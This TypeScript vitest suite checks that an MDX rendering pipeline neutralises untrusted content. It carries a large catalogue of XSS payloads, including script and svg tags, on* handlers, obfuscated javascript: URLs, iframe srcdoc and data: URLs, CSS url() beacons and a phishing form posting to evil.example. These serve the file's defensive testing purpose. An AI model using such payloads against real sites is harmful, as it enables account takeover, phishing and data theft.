import { createElement } from 'react'
import { renderToString } from 'react-dom/server'

import { MDXRemote } from 'next-mdx-remote'
import assert from 'node:assert/strict'
import { beforeEach, test } from 'vitest'

import { compileMdx, prepareMdxSource } from './compile'

type PwnedGlobal = typeof globalThis & { __mdxPwned?: unknown; __pwn?: unknown }

const pwned = globalThis as PwnedGlobal

const ALLOWED_TAGS = new Set([
	'p',
	'span',
	'div',
	'br',
	'b',
	'strong',
	'i',
	'em',
	'u',
	's',
	'del',
	'ins',
	'sub',
	'sup',
	'mark',
	'small',
	'code',
	'pre',
	'kbd',
	'img',
	'a',
	'ul',
	'ol',
	'li',
	'table',
	'thead',
	'tbody',
	'tfoot',
	'tr',
	'th',
	'td',
	'caption',
	'colgroup',
	'col',
	'blockquote',
	'hr',
	'h1',
	'h2',
	'h3',
	'h4',
	'h5',
	'h6',
	'tweet',
])

const GLOBAL_ATTRIBUTES = new Set(['style', 'title', 'align', 'dir', 'lang'])

const TAG_ATTRIBUTES: Record<string, Set<string>> = {
	a: new Set(['href']),
	img: new Set(['src', 'alt', 'width', 'height']),
	td: new Set(['colspan', 'rowspan']),
	th: new Set(['colspan', 'rowspan']),
	col: new Set(['span']),
	ol: new Set(['start']),
	li: new Set(['value']),
	tweet: new Set(['id']),
}

const SAFE_SCHEMES = new Set(['http:', 'https:', 'mailto:', 'tel:'])

const FORBIDDEN_STYLE =
	/url\s*\(|image-set\s*\(|image\s*\(|cross-fade\s*\(|element\s*\(|expression\s*\(|@import|javascript:|\\|(?:^|;)\s*position\s*:/i

const NAMED_ENTITIES: Record<string, string> = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'" }

function decodeEntities(value: string): string {
	return value.replace(/&(#x[0-9a-f]+|#[0-9]+|[a-z]+);/gi, (entity: string, body: string) => {
		if (body[0] === '#') {
			const code =
				body[1] === 'x' || body[1] === 'X' ? Number.parseInt(body.slice(2), 16) : Number.parseInt(body.slice(1), 10)
			return String.fromCodePoint(code)
		}
		return NAMED_ENTITIES[body.toLowerCase()] ?? entity
	})
}

type ParsedTag = { name: string; attributes: Array<[string, string]> }

function parseTags(html: string): ParsedTag[] {
	const source = html.replace(/<!--[\s\S]*?-->/g, '')
	const tags: ParsedTag[] = []
	let consumed = 0
	for (const match of source.matchAll(/<(\/?)([^\s/>]+)((?:\s+[^\s=/>]+(?:="[^"]*")?)*)\s*\/?>/g)) {
		consumed += 1
		if (match[1] === '/') continue
		const attributes: Array<[string, string]> = []
		for (const attribute of match[3].matchAll(/\s+([^\s=/>]+)(?:="([^"]*)")?/g)) {
			attributes.push([attribute[1].toLowerCase(), decodeEntities(attribute[2] ?? '')])
		}
		tags.push({ name: match[2].toLowerCase(), attributes })
	}
	assert.equal((source.match(/</g) ?? []).length, consumed, `неразобранная разметка в ${html}`)
	return tags
}

function hasSafeScheme(raw: string, allowDataImage: boolean): boolean {
	const value = Array.from(raw)
		.filter((char) => {
			const code = char.charCodeAt(0)
			return code > 0x20 && (code < 0x7f || code > 0x9f)
		})
		.join('')
		.toLowerCase()
	const scheme = value.match(/^([a-z][a-z0-9+.-]*:)/)
	if (!scheme) return true
	if (SAFE_SCHEMES.has(scheme[1])) return true
	return allowDataImage && /^data:image\/(png|jpe?g|gif|webp);/.test(value)
}

function isReactImagePreload(tag: ParsedTag, imageSources: Set<string>): boolean {
	if (tag.name !== 'link') return false
	const attributes = new Map(tag.attributes)
	if (attributes.size !== 3 || attributes.get('rel') !== 'preload' || attributes.get('as') !== 'image') return false
	const href = attributes.get('href')
	return href !== undefined && imageSources.has(href)
}

function assertAllowlistedMarkup(html: string) {
	const tags = parseTags(html)
	const imageSources = new Set(
		tags
			.filter((tag) => tag.name === 'img')
			.flatMap((tag) => tag.attributes.filter(([name]) => name === 'src').map(([, value]) => value))
	)
	for (const tag of tags) {
		if (isReactImagePreload(tag, imageSources)) continue
		assert.ok(ALLOWED_TAGS.has(tag.name), `тег <${tag.name}> вне белого списка: ${html}`)
		for (const [name, value] of tag.attributes) {
			const allowed = GLOBAL_ATTRIBUTES.has(name) || TAG_ATTRIBUTES[tag.name]?.has(name) === true
			assert.ok(allowed, `атрибут ${name} у <${tag.name}> вне белого списка: ${html}`)
			if (name === 'href' || name === 'src') {
				assert.ok(hasSafeScheme(value, tag.name === 'img' && name === 'src'), `опасная схема ${name}="${value}"`)
			}
			if (name === 'style') {
				assert.doesNotMatch(value, FORBIDDEN_STYLE, `опасный style="${value}"`)
			}
			if (tag.name === 'tweet' && name === 'id') {
				assert.match(value, /^\d+$/, `tweet id="${value}"`)
			}
		}
	}
}

async function renderUntrusted(source: string): Promise<{ html: string; compiled: boolean }> {
	const normalized = prepareMdxSource(source)
	let result: Awaited<ReturnType<typeof compileMdx>>
	try {
		result = await compileMdx(normalized)
	} catch {
		return { html: renderToString(createElement('div', null, normalized)), compiled: false }
	}
	return { html: renderToString(createElement(MDXRemote, { ...result, components: {} })), compiled: true }
}

function assertInert(html: string) {
	assert.doesNotMatch(html, /<script/i)
	assert.doesNotMatch(html, /\son[a-z]+=/i)
	assert.doesNotMatch(html, /\ssrcdoc=/i)
	for (const match of html.matchAll(/=\s*"([^"]*)"/g)) {
		assert.ok(!match[1].includes('__mdxPwned'), `атрибут содержит __mdxPwned: ${match[0]}`)
	}
}

const PAYLOADS: Array<{ name: string; source: string; compiled: boolean }> = [
	{
		name: 'выражение в блоке',
		source: `Абзац текста.

{globalThis.__mdxPwned = 'flow'}`,
		compiled: true,
	},
	{
		name: 'выражение в абзаце',
		source: `Текст {globalThis.__mdxPwned = 'inline'} дальше.`,
		compiled: true,
	},
	{
		name: 'ESM export (вырезает removeImportsExportsPlugin уже в v5)',
		source: `export const pwned = (globalThis.__mdxPwned = 'export')

абзац`,
		compiled: true,
	},
	{
		name: 'ESM import (вырезает removeImportsExportsPlugin уже в v5)',
		source: `import pwned from './pwned.js'

абзац`,
		compiled: true,
	},
	{
		name: 'выражение в атрибуте onError',
		source: `<img src="/a.png" alt="" onError={globalThis.__mdxPwned = 'attr'} />`,
		compiled: true,
	},
	{
		name: 'элемент script',
		source: `<script>globalThis.__mdxPwned = 'script'</script>

абзац`,
		compiled: true,
	},
	{
		name: 'iframe srcdoc со скриптом',
		source: `<iframe srcdoc="<script>globalThis.__mdxPwned='srcdoc'</script>"></iframe>

после`,
		compiled: true,
	},
	{
		name: 'строковые обработчики on*',
		source: `<img src="/a.png" alt="" onerror="globalThis.__mdxPwned='onerror'" />

<div onClick="globalThis.__mdxPwned='click'">x</div>`,
		compiled: true,
	},
	{
		name: 'javascript: в ссылках',
		source: `[ссылка](javascript:globalThis.__mdxPwned='link')

<a href="javascript:globalThis.__mdxPwned='a'">x</a>`,
		compiled: true,
	},
]

const LEGIT_FIXTURES: Array<{ name: string; source: string; expected: string[] }> = [
	{
		name: 'style у MDX-JSX span',
		source: '<span style="color: #e11d48; font-weight: 700">цвет</span>',
		expected: ['<span style="color:#e11d48;font-weight:700">цвет</span>'],
	},
	{
		name: 'style у блочного p',
		source: '<p style="text-align: center">по центру</p>',
		expected: ['<p style="text-align:center">по центру</p>'],
	},
	{
		name: 'GFM-таблица',
		source: `| А | Б |
| --- | --- |
| 1 | 2 |
| 3 | 4 |`,
		expected: [
			'<table>',
			'<th>А</th>',
			'<th>Б</th>',
			'<td>1</td>',
			'<td>2</td>',
			'<td>3</td>',
			'<td>4</td>',
			'</table>',
		],
	},
	{
		name: 'markdown-картинка',
		source: '![Клетка](uploads/tests/biology/cell/assets/a.png)',
		expected: ['<img src="uploads/tests/biology/cell/assets/a.png" alt="Клетка"/>'],
	},
	{
		name: 'HTML-картинка из редактора',
		source: '<img src="https://example.test/a.png" alt="схема" width="300" height="200" />',
		expected: ['<img src="https://example.test/a.png" alt="схема" width="300" height="200"/>'],
	},
	{
		name: 'нижний и верхний индексы',
		source: 'H<sub>2</sub>O и Ca<sup>2+</sup>',
		expected: ['<sub>2</sub>', '<sup>2+</sup>'],
	},
	{
		name: 'нумерация из редактора',
		source: `1) первый
2) второй`,
		expected: ['<p>1) первый</p>', '<p>2) второй</p>'],
	},
	{
		name: 'жирный и курсив',
		source: '**жирный** и *курсив*',
		expected: ['<strong>жирный</strong>', '<em>курсив</em>'],
	},
	{
		name: 'экранированные фигурные скобки',
		source: '\\{x\\}',
		expected: ['<p>{x}</p>'],
	},
]

const EXPRESSION_CONTENT: Array<{ name: string; source: string; expected: string }> = [
	{
		name: 'выражения в тексте',
		source: `число {2} и {' '} и {"{"}`,
		expected: '<p>число  и  и </p>',
	},
	{
		name: 'объектный style',
		source: `<span style={{ color: 'red' }}>x</span>`,
		expected: '<span>x</span>',
	},
]

const JS = (label: string) => `javascript:void(globalThis.__pwn='${label}')`

const ATTACKS: Array<{ id: string; name: string; source: string }> = [
	{
		id: 'S1',
		name: 'svg:script внутри svg',
		source: `<svg><svg:script>globalThis.__pwn = 'svg-ns'</svg:script></svg>

текст`,
	},
	{
		id: 'S1',
		name: 'svg:script с внешним href',
		source: `<svg><svg:script href="https://evil.example/x.js" /></svg>

текст`,
	},
	{ id: 'S1', name: 'svg:script вне svg', source: `<svg:script>globalThis.__pwn = 'ns'</svg:script>\n\nтекст` },
	{ id: 'S1', name: 'script внутри svg', source: `<svg><script>globalThis.__pwn = 'svg'</script></svg>\n\nтекст` },
	{ id: 'S1', name: 'Script с заглавной', source: `<Script>globalThis.__pwn = 'cap'</Script>\n\nтекст` },
	{ id: 'S1', name: 'svg onload', source: `<svg onload="globalThis.__pwn='onload'"></svg>` },
	{
		id: 'S1',
		name: 'svg animate onbegin',
		source: `<svg><animate onbegin="globalThis.__pwn='onbegin'" attributeName="x" dur="1s" /></svg>`,
	},
	{ id: 'S2', name: 'iframe SRC javascript:', source: `<iframe SRC="${JS('iframe-SRC')}"></iframe>` },
	{ id: 'S2', name: 'iframe src javascript:', source: `<iframe src="${JS('iframe-src')}"></iframe>` },
	{
		id: 'S2',
		name: 'iframe src data:text/html',
		source: `<iframe src="data:text/html,<script>parent.__pwn='data'</script>"></iframe>`,
	},
	{ id: 'S2', name: 'iframe srcDoc', source: `<iframe srcDoc="<script>parent.__pwn='srcDoc'</script>"></iframe>` },
	{ id: 'S2', name: 'object DATA javascript:', source: `<object DATA="${JS('object')}"></object>` },
	{ id: 'S2', name: 'embed SRC javascript:', source: `<embed SRC="${JS('embed')}" />` },
	{ id: 'S3', name: 'base href', source: `<base href="https://evil.example/" />\n\nтекст` },
	{ id: 'S4', name: 'a HREF javascript:', source: `<a HREF="${JS('a-HREF')}">x</a>` },
	{ id: 'S4', name: 'A HREF JaVaScRiPt:', source: `<A HREF="JaVaScRiPt:void(globalThis.__pwn='mixed')">x</A>` },
	{ id: 'S4', name: 'href с пробелами', source: `<a href="  ${JS('ws')}">x</a>` },
	{ id: 'S4', name: 'href с управляющим символом', source: `<a href="\u0001 ${JS('ctrl')}">x</a>` },
	{ id: 'S4', name: 'href с сущностью', source: `<a href="jav&#x61;script:void(globalThis.__pwn='ent')">x</a>` },
	{ id: 'S4', name: 'href с переводом строки', source: `<a href="java&#10;script:void(globalThis.__pwn='nl')">x</a>` },
	{ id: 'S4', name: 'href с табуляцией', source: `<a href="java\tscript:void(globalThis.__pwn='tab')">x</a>` },
	{ id: 'S4', name: 'href vbscript:', source: `<a href="vbscript:x">x</a>` },
	{ id: 'S4', name: 'href data:text/html', source: `<a href="data:text/html,<script>parent.__pwn='d'</script>">x</a>` },
	{ id: 'S4', name: 'href выражением', source: `<a href={"${JS('expr')}"}>x</a>` },
	{ id: 'S4', name: 'href через spread', source: `<a {...{ href: "${JS('spread')}" }}>x</a>` },
	{ id: 'S4', name: 'form ACTION javascript:', source: `<form ACTION="${JS('form')}"><button>go</button></form>` },
	{ id: 'S4', name: 'button formaction', source: `<form><button formaction="${JS('formaction')}">go</button></form>` },
	{ id: 'S4', name: 'button formAction', source: `<form><button formAction="${JS('formAction')}">go</button></form>` },
	{
		id: 'S4',
		name: 'svg set attributeName=href',
		source: `<svg><a><set attributeName="href" to="${JS('set')}" /><text x="10" y="20">go</text></a></svg>`,
	},
	{
		id: 'S4',
		name: 'svg animate attributeName=href',
		source: `<svg><a><animate attributeName="href" values="${JS('animate')}" /><text x="10" y="20">go</text></a></svg>`,
	},
	{
		id: 'S4',
		name: 'svg xlink:href',
		source: `<svg><a xlink:href="${JS('xlink')}"><text x="10" y="20">x</text></a></svg>`,
	},
	{ id: 'S4', name: 'math xlink:href', source: `<math><mi xlink:href="${JS('math')}">x</mi></math>` },
	{
		id: 'S4',
		name: 'details ontoggle',
		source: `<details open ontoggle="globalThis.__pwn='toggle'"><summary>s</summary>x</details>`,
	},
	{ id: 'S4', name: 'markdown-ссылка javascript:', source: `[x](${JS('md')})` },
	{ id: 'S4', name: 'markdown-ссылка с сущностью', source: `[x](jav&#x61;script:void(globalThis.__pwn='mdent'))` },
	{ id: 'S4', name: 'markdown-картинка javascript:', source: `![x](${JS('mdimg')})` },
	{
		id: 'S4',
		name: 'markdown-ссылка по определению',
		source: `[x][ref]

[ref]: ${JS('def')}`,
	},
	{
		id: 'S5',
		name: 'meta refresh',
		source: `<meta http-equiv="refresh" content="0;url=https://evil.example/" />\n\nтекст`,
	},
	{
		id: 'S5',
		name: 'link stylesheet',
		source: `<link rel="stylesheet" href="https://evil.example/x.css" precedence="default" />\n\nтекст`,
	},
	{ id: 'S5', name: 'style', source: `<style>body{background:rgb(255,0,0)}</style>\n\nтекст` },
	{
		id: 'S5',
		name: 'style с экранированными скобками',
		source: `<style>body\\{background:rgb(255,0,0)\\}</style>\n\nтекст`,
	},
	{
		id: 'S5',
		name: 'style с precedence',
		source: `<style precedence="x" href="h">body\\{background:rgb(255,0,0)\\}</style>\n\nтекст`,
	},
	{ id: 'S5', name: 'style @import', source: `<style>@import "https://evil.example/x.css";</style>\n\nтекст` },
	{ id: 'S5', name: 'внешний iframe', source: `<iframe src="https://evil.example/phish"></iframe>` },
	{ id: 'S5', name: 'внешний object', source: `<object data="https://evil.example/o.html"></object>` },
	{ id: 'S5', name: 'внешний embed', source: `<embed src="https://evil.example/e.html" />` },
	{
		id: 'S5',
		name: 'внешняя форма',
		source: `<form action="https://evil.example/login" method="post"><input name="p" /><button>go</button></form>`,
	},
	{
		id: 'Missed',
		name: 'img style с url()',
		source: `<img src="/a.png" style="background:url(https://evil.example/t.png)" alt="" />`,
	},
	{
		id: 'Missed',
		name: 'style с экранированным url()',
		source: `<span style="background: u\\72l(https://evil.example/t.png)">x</span>`,
	},
	{
		id: 'Missed',
		name: 'style с image-set()',
		source: `<span style="background-image: image-set('https://evil.example/t.png' 1x)">x</span>`,
	},
	{
		id: 'Missed',
		name: 'оверлей position:fixed',
		source: `<span style="position: fixed; inset: 0; background: red">x</span>`,
	},
	{ id: 'Missed', name: 'img srcset', source: `<img src="/a.png" srcset="https://evil.example/t.png 1x" alt="" />` },
	{ id: 'Missed', name: 'a target=_blank', source: `<a href="https://evil.example/" target="_blank">x</a>` },
	{ id: 'Missed', name: 'a ping', source: `<a href="https://example.test/" ping="https://evil.example/p">x</a>` },
	{ id: 'Missed', name: 'id на img', source: `<img id="__NEXT_DATA__" src="/a.png" alt="" />` },
	{ id: 'Missed', name: 'tweet с нецифровым id', source: `<tweet id="__NEXT_DATA__" />` },
	{ id: 'Missed', name: 'class на div', source: `<div class="fixed inset-0 z-50">x</div>` },
	{ id: 'Missed', name: 'заглавный A', source: `<A href="https://example.test/">x</A>` },
	{ id: 'Missed', name: 'заглавный Img', source: `<Img src="/a.png" alt="x" />` },
	{ id: 'Missed', name: 'заглавный Kbd', source: `<Kbd>k</Kbd>` },
	{
		id: 'Missed',
		name: 'script внутри неизвестных тегов',
		source: `<Foo><Bar><script>globalThis.__pwn='nested'</script>видимый</Bar></Foo>`,
	},
]

const RENDER_SAFETY: Array<{ name: string; source: string; expected?: string }> = [
	{ name: 'пустой style', source: `<span style="">x</span>` },
	{ name: 'style из пробелов', source: `<span style="   ">x</span>` },
	{ name: 'style без двоеточия', source: `<span style="color">x</span>`, expected: '<span>x</span>' },
	{
		name: 'STYLE в верхнем регистре',
		source: `<span STYLE="color: red">x</span>`,
		expected: '<span style="color:red">x</span>',
	},
	{ name: 'неизвестный компонент', source: `до <Foo /> после` },
	{ name: 'составное имя x.script', source: `<x.script>a</x.script>\n\nтекст` },
	{ name: 'img с детьми', source: `<img src="/a.png">подпись</img>` },
	{ name: 'br с детьми', source: `<br>a</br>` },
	{ name: 'строковый dangerouslySetInnerHTML', source: `<div dangerouslySetInnerHTML="x">y</div>` },
	{ name: 'фрагмент', source: `<>текст</>` },
]

beforeEach(() => {
	delete pwned.__mdxPwned
	delete pwned.__pwn
})

for (const payload of PAYLOADS) {
	test(`конвейер: ${payload.name} доходит до рендера`, async () => {
		const { html, compiled } = await renderUntrusted(payload.source)
		assert.equal(compiled, payload.compiled)
		assert.equal(typeof html, 'string')
		assert.ok(html.length > 0)
	})

	test(`${payload.name} не исполняется`, async () => {
		const { html, compiled } = await renderUntrusted(payload.source)
		assert.equal(compiled, payload.compiled)
		assert.equal(pwned.__mdxPwned, undefined)
		assertInert(html)
	})

	test(`белый список: ${payload.name}`, async () => {
		const { html } = await renderUntrusted(payload.source)
		assertAllowlistedMarkup(html)
	})
}

for (const attack of ATTACKS) {
	test(`${attack.id}: ${attack.name} отрендерен только из белого списка`, async () => {
		const { html } = await renderUntrusted(attack.source)
		assert.equal(pwned.__mdxPwned, undefined)
		assert.equal(pwned.__pwn, undefined)
		assertAllowlistedMarkup(html)
	})
}

for (const item of RENDER_SAFETY) {
	test(`S6: ${item.name} не роняет рендер`, async () => {
		const { html, compiled } = await renderUntrusted(item.source)
		assert.equal(compiled, true)
		assert.ok(html.length > 0)
		assertAllowlistedMarkup(html)
		if (item.expected) assert.ok(html.includes(item.expected), `нет ${item.expected} в ${html}`)
	})
}

const STRIPPED_JSX: Array<{ name: string; source: string; forbidden: RegExp; kept: string }> = [
	{
		name: 'блочный script',
		source: `до

<script>globalThis.__mdxPwned = 'flow-script'</script>

после`,
		forbidden: /script|__mdxPwned/i,
		kept: 'после',
	},
	{
		name: 'строчный script',
		source: `до <script>globalThis.__mdxPwned = 'text-script'</script> после`,
		forbidden: /script|__mdxPwned/i,
		kept: 'после',
	},
	{
		name: 'script в верхнем регистре',
		source: `<SCRIPT>globalThis.__mdxPwned = 'upper'</SCRIPT>

после`,
		forbidden: /script|__mdxPwned/i,
		kept: 'после',
	},
	{
		name: 'srcdoc в любом регистре',
		source: `<iframe srcDoc="<b>x</b>" title="кадр"></iframe>

после`,
		forbidden: /srcdoc/i,
		kept: 'после',
	},
	{
		name: 'строковые on*',
		source: `<img src="/a.png" alt="картинка" onerror="globalThis.__mdxPwned='onerror'" />

<div ONCLICK="globalThis.__mdxPwned='click'">x</div>`,
		forbidden: /\bon(error|click)\b|__mdxPwned/i,
		kept: 'картинка',
	},
]

for (const item of STRIPPED_JSX) {
	test(`remarkMdxAllowlist вырезает из скомпилированного кода: ${item.name}`, async () => {
		const { compiledSource } = await compileMdx(prepareMdxSource(item.source))
		assert.doesNotMatch(compiledSource, item.forbidden)
		assert.ok(compiledSource.includes(item.kept), `нет ${item.kept} в ${compiledSource}`)
	})
}

for (const fixture of LEGIT_FIXTURES) {
	test(`эталон: ${fixture.name}`, async () => {
		const { html, compiled } = await renderUntrusted(fixture.source)
		assert.equal(compiled, true)
		for (const fragment of fixture.expected) {
			assert.ok(html.includes(fragment), `нет фрагмента ${fragment} в ${html}`)
		}
	})
}

for (const item of EXPRESSION_CONTENT) {
	test(`контент с выражениями: ${item.name}`, async () => {
		const { html, compiled } = await renderUntrusted(item.source)
		assert.equal(compiled, true)
		assert.equal(html.replace(/<!-- -->/g, ''), item.expected)
	})
}
